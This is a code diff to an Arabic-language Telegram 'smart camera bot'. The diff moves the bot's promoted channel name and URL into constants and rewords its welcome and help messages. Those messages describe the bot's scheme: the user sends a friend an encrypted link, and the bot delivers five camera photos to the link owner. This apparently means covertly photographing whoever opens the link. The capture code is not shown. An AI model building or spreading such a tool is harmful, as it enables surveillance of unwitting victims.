@@ -32,6 +32,9 @@ last_profile_update = {'last_update': 0}
 # تخزين أوامر المستخدمين للحد من السرعة
 user_commands = defaultdict(list)
 
+CHANNEL_NAME = "عالم البرمجيات | Software World"
+CHANNEL_URL = "https://t.me/KhaldounSoft"
+
 def parse_date(date_value):
     """تحويل التاريخ من نص إلى كائن datetime"""
     if isinstance(date_value, str):
@@ -107,7 +110,7 @@ def setup_bot_commands():
         logger.error(f"Failed to setup bot commands: {e}")
 
 def update_bot_profile(force=False):
-    """تحديث اسم البوت ووصفه مع عدد المستخدمين ورابط القناة"""
+    """تحديث اسم البوت ووصفه مع عدد المستخدمين (مع تحديد معدل التحديث)"""
     current_time = time.time()
     
     # تحديث كل 5 دقائق فقط ما لم يكن force=True
@@ -117,20 +120,20 @@ def update_bot_profile(force=False):
     try:
         total_users = len(user_stats)
         
-        # تحديث وصف البوت (البيو) مع إضافة رابط القناة
+        # تحديث وصف البوت (البيو)
         bot.set_my_description(
             f"📸 بوت الكاميرا الذكية\n"
             f"👥 عدد المستخدمين: {total_users}\n"
             f"🖼️ إجمالي الصور: {total_photos_received}\n\n"
             f"✨ بوت متخصص بالتقاط 5 صور من الكاميرا وإرسالها إليك\n\n"
             f"📢 انضم إلى القناة لمتابعة كل جديد:\n"
-            f"عالم البرمجيات | Software World\n"
-            f"https://t.me/KhaldounSoft"
+            f"👉 {CHANNEL_NAME}\n"
+            f"{CHANNEL_URL}"
         )
         
         # تحديث النص القصير (about)
         bot.set_my_short_description(
-            f"📸 بوت الكاميرا الذكية | {total_users} مستخدم | t.me/KhaldounSoft"
+            f"📸 بوت الكاميرا الذكية | {total_users} مستخدم | 📢 {CHANNEL_URL}"
         )
         
         last_profile_update['last_update'] = current_time
@@ -205,11 +208,9 @@ def send_welcome(message):
     # إنشاء أزرار
     markup = InlineKeyboardMarkup(row_width=2)
     
-    # زر نسخ الرابط
+    # زر نسخ الرابط وزر القناة
     copy_button = InlineKeyboardButton(text="📋 انسخ الرابط", callback_data=f"copy_{encrypted}")
-    
-    # زر انضمام للقناة
-    channel_button = InlineKeyboardButton(text="📢 عالم البرمجيات", url="https://t.me/KhaldounSoft")
+    channel_button = InlineKeyboardButton(text="📢 انضم للقناة", url=CHANNEL_URL)
     
     # أزرار المساعدة والإحصائيات
     help_button = InlineKeyboardButton(text="❓ التعليمات", callback_data="help")
@@ -234,8 +235,8 @@ def send_welcome(message):
        f"2️⃣ أرسله لصديقك في رسالة (أو جربه بنفسك).\n"
        f"3️⃣ سيبدأ البوت فوراً بإرسال الصور إليك.\n\n"
        f"🔒 *ملاحظة:* الرابط مشفر بالكامل، لا يمكن لأحد معرفة الرقم الأصلي.\n\n"
-       f"📢 *تابعنا لمزيد من البوتات والبرامج:*\n"
-       f"[عالم البرمجيات | Software World](https://t.me/KhaldounSoft)"
+       f"📢 *انضم إلى القناة لمتابعة كل جديد:*\n"
+       f"[{CHANNEL_NAME}]({CHANNEL_URL})"
     )
     bot.send_message(user_id, response, parse_mode="Markdown", reply_markup=markup)
     logger.info(f"User started: {user_name} (ID: {user_id}) - New: {is_new_user}")
@@ -481,7 +482,8 @@ def send_help(message):
         f"• البوت يأخذ 5 صور فقط ثم يتوقف\n"
         f"• يمكن إعادة فتح الرابط لالتقاط المزيد\n"
         f"• الصور تصل فقط لصاحب الرابط\n\n"
-        f"📢 *تابعنا على القناة:* https://t.me/KhaldounSoft\n"
+        f"📢 *انضم إلى القناة لمتابعة كل جديد:*\n"
+        f"[{CHANNEL_NAME}]({CHANNEL_URL})\n\n"
         f"🛠️ للمساعدة التقنية: @khaled_developer"
     )
     
